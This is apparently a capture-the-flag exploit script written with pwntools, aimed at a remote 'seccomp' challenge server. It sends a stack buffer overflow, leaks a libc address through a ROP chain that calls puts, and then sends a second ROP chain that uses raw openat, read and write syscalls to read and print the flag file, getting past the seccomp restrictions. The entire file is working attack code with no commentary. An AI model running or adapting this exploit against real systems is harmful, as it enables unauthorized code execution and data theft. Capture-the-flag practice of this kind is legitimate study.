#!/usr/bin/env python

from pwn import *
import re

libc = ELF("./libc.so.6")
#r = process("./seccomp", env={"LD_PRELOAD": "./libc.so.6 libseccomp.so.2"})
r = remote("211.239.124.246", 12403)
pause()

r.recvuntil("Input your age : ")
r.sendline("100")

r.recvuntil("What's your name? : ")
payload = (
    "A" * 272 +
    p64(0x602060) +
    p64(0x400eb3) + #  pop rdi ; ret
    p64(0x601fa0) + # R_X86_64_GLOB_DAT  puts@GLIBC_2.2.5
    p64(0x400b9b)   # call puts
)
r.sendline(payload)

data = r.recvuntil("Input your age : ")
leak = u64(re.search("\n(.*?)\n", data).group(1).ljust(8, "\x00"))
base = leak - 0x6f690
pop_rdi = 0x400eb3
pop_rsi = base + 0x202e8 #  pop rsi ; ret
pop_rdx = base + 0x1b92 # pop rdx ; ret
pop_rax = base + 0x33544 # pop rax ; ret
pop_r10 = base + 0x1150a5 # pop r10 ; ret
syscall = base + 0xbc375 # syscall ; ret

log.info("Leak: %x", leak)
log.info("Libc Base: %x", base)

r.send("\x26")

r.recvuntil("What's your name? : ")
flag_size = 160 
payload = (
    "12345\x00\x00\x00" +

    # open
    p64(pop_rdi) +
    p64(0x0) +
    p64(pop_rsi) +
    p64(0x602150) +
    p64(pop_rdx) +
    p64(0x0) +
    p64(pop_r10) +
    p64(0x0) +
    p64(pop_rax) +
    p64(257) +  # sys_openat
    p64(syscall) +

    # read
    p64(pop_rdi) +
    p64(0x3) +
    p64(pop_rsi) +
    p64(0x602220) + # <adult+448>:
    p64(pop_rdx) +
    p64(flag_size) +
    p64(pop_rax) +
    p64(0x0) +  # sys_read
    p64(syscall) +

    # write
    p64(pop_rdi) +
    p64(0x1) +
    p64(pop_rsi) +
    p64(0x602220) + # <adult+448>
    p64(pop_rdx) +
    p64(flag_size) +
    p64(pop_rax) +
    p64(0x1) +  # sys_write
    p64(syscall) +
    "/home/se" +
    "ccomp/fl" +
    "ag\x00" 
)
r.send(payload)
print(r.recvall())
